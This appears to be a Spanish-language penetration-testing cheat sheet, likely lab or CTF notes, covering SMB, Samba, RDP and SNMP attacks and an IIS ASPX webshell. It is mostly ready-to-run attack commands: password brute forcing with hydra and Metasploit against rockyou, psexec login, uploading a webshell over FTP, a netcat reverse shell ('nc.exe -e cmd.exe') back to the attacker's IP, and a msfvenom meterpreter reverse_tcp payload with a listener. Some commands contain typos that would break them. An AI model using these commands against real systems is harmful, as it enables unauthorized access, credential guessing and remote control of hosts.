## SMB (445)

### smbclient

``` bash
smbclient -L IP -N # Null session

hydra -l mario -P /usr/share/wordlists/rockyou.txt smb://IP

smbclient -L //IP -U 'mario' # Ver directorios

smbclient -U 'mario' //IP/Users # Acceder a los recursos
```

### smbmap

``` bash
smbmap -H IP

smbmap -H IP -u 'mario' -p '123123' # Ver permisos de directorio

smbmap -u 'ken' -p 'kenken' -H IP -r ken
```

### metasploit

``` bash
msf6 > use auxiliary/scanner/smb/smb_login

set RHOSTS IP
set VERBOSE false
set SMBUser mario
set PASS_FILE /usr/share/wordlists/rockyou.txt

msf6 > use exploit/windows/smb/psexec
set RHOSTS IP
set SMBUser mario
set SMBPass 123123
```

## SAMBA (445)

### rpcclient

```bash
rpcclient -U "" -N IP
rpcclient $> srvinfo
rpcclient $> querythispinfo
rpcclient $> enumdomusers
```

## RDP (3389)

### xfreerdp

```bash
xfreerdp /u:Administrator /p:letmein123! /v:IP:3389
```

## SNMP (161)

### onesixtyone (conseguir clave de comunidad)

```bash
onesixtyone -c /usr/share/wordlists/rockyou.txt
```

### snmpwalk

```bash
snpwalk -v 2c -c clave IP
```

## Webshell ASPX en IIS (Internet Information Services)

```bash
find / -name cmdasp.aspx 2>/dev/null
/usr/share/webshells/aspx/cmdsp.aspx

ftp> put cmdasp.aspx
```

Una vez hayamos subido la shell

```bash
find / -name nc.exe 2>/dev/null
/usr/share/windows/resources/binaries/nc.exe

impacket-smbserver recurso $(pwd) -smb2support

sudo nc -nlvp 443
```

Y en la shell:

```bash
\\nuestraIP\recurso\nc.exe -e cmd.exe nuestraIP 443
```

### opción B

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOSTS=nuestraIP LPORT=4444 -f aspx -o shell.aspx

ftp> put shell.aspx

msfconsole
use multi/handler
set LHOST nuestraIP
set PAYLOAD windows/meterpreter/reverse_tcp
run
```

## Obtener hotfixes en Windows

```powershell
(Get-HotFix).Count

wmic qfe list brief /format:table
```